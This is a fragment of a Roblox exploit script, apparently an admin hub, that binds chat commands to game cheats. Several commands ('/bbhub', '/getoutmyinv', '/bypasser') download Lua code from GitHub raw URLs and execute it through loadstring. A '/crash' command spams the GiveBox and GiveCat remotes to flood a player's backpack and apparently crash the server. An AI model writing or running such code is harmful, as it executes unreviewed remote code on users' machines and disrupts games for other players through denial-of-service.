...
-- /bbhub-- cool boombox tricks--

game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/bbhub" then loadstring(game:HttpGet("https://raw.githubusercontent.com/Salmon-B0T/SalmonHub/main/SalmonHub.lua", true))() end end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/getoutmyinv" then loadstring(game:HttpGet('https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/getoutmyinv', true))() end end)
...
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/bypasser" then loadstring(game:HttpGet('https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/bypasser', true))() end end)
...
game:GetService("Players").LocalPlayer.Chatted:connect(
    function(msg)
        if string.lower(msg) == "/crash" then -- harun
            local Player = game:GetService("Players").LocalPlayer
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local Remotes = {ReplicatedStorage.GiveBox, ReplicatedStorage.GiveCat}
            for i = 1, 400 do
            ...
            repeat
                task.wait()
            until #Player.Backpack:GetChildren() >= 800
